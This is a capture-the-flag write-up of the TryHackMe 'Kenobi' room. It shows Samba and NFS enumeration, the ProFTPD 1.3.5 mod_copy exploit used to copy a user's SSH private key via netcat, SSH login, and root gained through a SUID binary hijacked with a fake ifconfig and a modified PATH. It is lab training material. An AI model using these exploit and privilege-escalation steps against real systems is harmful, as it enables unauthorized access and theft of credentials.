Kenobi is a room walking through the exploitation of a Linux machine. It involves enumerating Samba shares, exploiting vulnerable programs, and privilege escalation.

### Recon

We start with a basic nmap scan.

##### Command:
>nmap --top-ports 10000 [target]

```
└─$ nmap --top-ports 10000 [target]

Nmap scan report for [target]
Host is up (0.024s latency).
Not shown: 8333 closed ports

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs

Nmap done: 1 IP address (1 host up) scanned in 6.25 seconds
```

We see that both FTP and SSH are open on ports 21 and 22 respectively, and there is a web server running on port 80.

Port 111 has the ```rpcbind``` service running. According to the Linux manual page, ```rcpbind``` is a service for converting RPC program numbers into universal addresses. RPC (remote procedure call) program numbers are identifiers that allow remote machines to access programs on a server. When an RPC service is started, it tells the ```rpcbind``` service the address at which it is listening, and the RPC program it is serving.

Port 139 has ```NetBIOS``` running. ```NetBIOS``` (network basic input/output system) allows communication over local area networks. SMB (server message block) used to run on top of ```NetBIOS``` on port 139.

Port 445 is running ```microsoft-ds```. Windows uses this service for SMB (server message block), a protocol for file-sharing over a network. SMB over port 445 runs on top of the TCP stack, so SMB file sharing can be run over the internet.

Port 2049 has ```nfs_acl``` running. This is a service for remote computers to access NFS (network file system) file shares.

Now we know the open ports, let’s do a more aggressive scan of these ports.
##### Command:
>nmap -O -sC -sV -p 21,22,80,111,139,445,2049 [target]

```
└─$ sudo nmap -O -sC -sV -p 21,22,80,111,139,445,2049 [target]

Nmap done: 1 IP address (1 host up) scanned in 20.50 seconds
```

Let’s examine this output. We see that the FTP service on port 21 is using ```ProFTPD 1.3.5```, and SSH on port 22 is running ```OpenSSH 7.2p2``` on Ubuntu 2.7. Port 80 is running ```Apache 2.4.18```, and we see an admin subdirectory taken from the ```/robots.txt``` file.

The ```rpcinfo``` nmap script that ran on port 111 was more enlightening. This gave us a list of RPC values, and more ports and services. We see that ```mountd``` is running on ports 32824, 35403, 35455, and 46791. ```nlockmgr``` is running on ports 33541, 34289, 36771, and 40170. ```mountd``` is an RPC service that answers client requests to mount a file system. Mounting a file system attaches that file system to a directory and makes it available to the system. ```nlockmgr``` is an RPC service for locking files in NFS.

We have also learnt that ports 139 and 445 are using Samba shares. Samba allows for file sharing over multiple operating systems.

The nmap scripts that ran gave us some valuable information. We now know that Samba is using version 4.3.11 for Ubuntu, the computer’s name is ```kenobi```, the NetBIOS name is ```KENOBI\x00``` and smb2 does not require message signing.

We now run another aggressive nmap scan on the new ports and services discovered by the ```rpcinfo``` script. We first run a scan against the TCP ports, then a UDP scan with the ```-sU``` flag on the UDP ports.

```
Nmap scan report for [target]
Host is up (0.019s latency).

```

```
Nmap scan report for [target]

40170/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 3.32 seconds
```

Neither of these scans gave us any more interesting information. Since this machine is running lots of file sharing services, we can deduce that the ```rpcbind``` service is being used for access to a network file system.

Let’s now run some nmap scripts on the ```rpcbind``` service on port 111.

##### Command:

>nmap --script=nfs-ls,nfs-statfs,nfs-showmount -p 111 [target]

```
└─$ nmap --script=nfs-ls,nfs-statfs,nfs-showmount -p 111 [target]

Nmap scan report for 10.10.102.223

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount:
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 1.29 seconds
```

We see that the mount point for this NFS is ```/var```.

Next, we will check out that web server on port 80 and its ```/admin``` subdirectory.

![alt text](/assets/img/tryhackme/kenobi/webpage.PNG "Web Page")

![alt text](/assets/img/tryhackme/kenobi/admin.PNG "Web Page")

There was also nothing in the page source - clearly a red herring. It appears the Samba shares are the best route to go down.

### Enumerating Samba Shares

Nmap has some scripts for enumerating Samba shares - ```smb-enum-shares``` and ```smb-enum-users```. We run these scripts.

##### Command:
>nmap --script=smb-enum-shares.nse,smb-enum-users.nse [target]

```
└─$ nmap --script=smb-enum-shares.nse,smb-enum-users.nse [target]

Nmap scan report for [target]
Host is up (0.036s latency).

Host script results:

|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 7.39 seconds
```

We have three shares here - ```IPC$```, ```anonymous``` and ```print$```. ```Anonymous``` sounds interesting, and it allows anonymous users to read and write to it. We will now use SMBClient to connect to anonymous.

##### Command:
>smbclient //[target]/anonymous

```
└─$ smbclient //[target]/anonymous

                9204224 blocks of size 1024. 6877092 blocks available
```

Turns out we don’t even need a password to enter the share! Let’s download this ```log.txt``` file to our local system with the ```mget``` command - it could have some juicy information.

The contents of ```log.txt``` were quite long - below are the most informative parts.

```

```

We have some SSH information, including a key fingerprint and randomart. We also know that the SSH username is ```kenobi```, and the private key is stored in ```/home/kenobi/.ssh/id_rsa```.

    DenyAll
  </Limit>

```

We have some configuration information on the ProFTPD FTP server. It allows for anonymous logins with the user ftp or anonymous, runs under the user ```kenobi``` and files are overwritable.

There is also a lot of Samba configuration information. The line below suggests that the Samba shares are not protected with a firewall.

```
# Only bind to the named interfaces and/or networks; you must use the
# 'interfaces' option above to use this.
# It is recommended that you enable this feature if your Samba machine is
# not protected by a firewall or is a firewall itself.  However, this
# option cannot handle dynamic or non-broadcast interfaces correctly.
;   bind interfaces only = yes
```

The Samba log file is located at ```/var/log/samba/log.%m```.

Guests are able to read and browse the path ```/home/kenobi/share```, as suggested by the line below.

```
[anonymous]
   path = /home/kenobi/share
   browseable = yes
   read only = yes
   guest ok = yes
```

### Exploiting ProFtpd

Now that we have some knowledge of the Samba shares and FTP service, we will try to exploit the ProFTPD service running on port 21. ProFTPD is an open-source FTP server, used on Windows and Unix systems. Rapid7 has a page about exploiting the mod_copy module of ProFTPD 1.3.5 [here](https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/). This module implements the commands ```SITE CPFR``` and ```SITE CPTO```, which allow for copying files from one location to another on the server. Read more about the mod_copy module [here](http://www.proftpd.org/docs/contrib/mod_copy.html). Turns out these commands do not require authentication to use.

We can copy ```kenobi```’s private SSH key (stored in ```/home/kenobi/.ssh/id_rsa```) to the mount point, ```/var```. We will then mount this drive to our own machine, and access the private key.

We connect to the service with netcat and copy the private key to the mount point.
##### Commands:
>nc [target] 21
<br>SITE CPFR /home/kenobi/.ssh/id_rsa
<br>SITE CPTO /var/tmp/id_rsa

```
└─$ nc [target] 21                                               
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [ [target] ]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

The file has been successfully copied. We now mount the ```/var``` directory to our machine.

##### Commands:
>mkdir mnt/kenobi
<br>mount [target]:/var mnt/kenobi (requires sudo privileges)
<br>ls mnt/kenobi/tmp

```
└─$ sudo mkdir mnt/
└─$ sudo mount [target]:/var /mnt/kenobi
└─$ cd kenobi                                          
└─$ ls tmp      
id_rsa
(...)
```

We can see ```id_rsa``` in our own system - this is ```kenobi```’s SSH private key!

### Initial Access to Kenobi

We can now have all the ingredients we need to SSH into Kenobi’s account. We first modify the permissions of ```id_rsa``` to read-only using ```chmod 600 tmp/id_rsa```, then SSH in.

##### Command:
>ssh kenobi@[target] -i tmp/id_rsa

```
─$ ssh kenobi@[target] -i tmp/id_rsa

share  user.txt
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
```

We have now found the first flag, in ```user.txt```

### Privilege Escalation

We now want to elevate our privileges and gain root access. One method of privilege escalation is through files with their SUID or SGID bits set. SUID or SGID files are executed as the file or group owner, respectively. For some binaries, such as ```passwd```, any user needs to be able to run it to change their own password. However, misconfigured SUID or SGID files can lead to all sorts of privilege escalation related issues.

Let’s search for any SUID files we can exploit. We can use the ```find``` command in Linux. We search the entire root directory ```\```, for anything with SUID permissions set ```-perm -u=s```, that are files ```-type f```. We also send any blocked searches and errors to ```/dev/null``` so that they don't appear on screen.

##### Command:
>find / -perm -u=s -type f 2>/dev/null

This gave a list of fairly normal looking binaries, except for ```/usr/bin/menu```.

When ```menu``` is run, we are (unsurprisngly) met with a menu.

```
kenobi@kenobi:/usr/bin$ ./menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

When 1 is selected, we get an HTTP response indicating the status of a web server (presumably the red herring webpage from before)

```
HTTP/1.1 200 OK
Date: Sat, 03 Sep 2022 16:09:35 GMT
Server: Apache/2.4.18 (Ubuntu)

Accept-Ranges: bytes

Vary: Accept-Encoding
Content-Type: text/html
```

When 2 is selected, we get the kernel version, ```4.8.0-58-generic```.

When 3 is selected, we get the output from running the command ```ifconfig```.

So this binary is running commands as the file owner, since it has its SUID bit set. We see that the owner of this file is root, so this binary is running commands as root.

##### Command:
>ls -la menu

```
-rwsr-xr-x 1 root root 8880 Sep  4  2019 menu
```

Let’s investigate this binary further by checking out what strings are left in the compiled binary.

##### Command:
>strings menu

```
(...)
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
;*3$"
(...)
```

These interesting strings are present in the binary. We see that it is running ```curl```, ```uname``` and ```ifconfig``` without quoting the full file path (i.e. it is running ```uname -r```, not ```/usr/bin/uname -r```). This may seem like unnecessary nitpicking at the developer, but this is in fact a serious vulnerability.

We can create a new file called ```ifconfig``` in ```/tmp```, pop a shell into our new fake ```ifconfig``` file, and run the menu binary. Since menu is running these commands as root, and there is no full path for the binary to find the true ```ifconfig```, it will run our malicious version instead, giving us a root shell.

##### Commands:
>cd /tmp
<br>touch ifconfig
<br>echo “/bin/sh” > ifconfig
<br>chmod +x ifconfig
<br>/usr/bin/menu

This did not work at first, I was getting the same ```ifconfig``` output as before. This is because menu was still running the original ```ifconfig``` file. We forgot a crucial step - changing the path variable. ```/tmp``` was added to the front of ```PATH```, so that ```menu``` executes ```ifconfig``` from ```/tmp```.

##### Command:
>export PATH=/tmp:$PATH

Now when ```menu``` was run, we got a root shell!

### Conclusion

In this room, we explored a Linux file sharing system over SMB, using Samba. We enumerated Samba shares, exfiltrated data, and exploited a vulnerable FTP client. To gain root, we then exploited a SUID misconfiguration, and exploited a missing file path vulnerability.

This room highlighted the importance of effective reconnaissance at the beginning of a penetration test. Through a detailed reconnaissance process, we uncovered lots of information that helped us later. For example, we found the mountable drive ```\var```, the name of the SSH user ```kenobi```, and the version of ProFTPD which led us to an exploit. This also highlights the importance of hiding information from potential malicious actors, no matter how mundane it may seem on its own - any piece of information about a system could help an attacker, so must be well hidden.
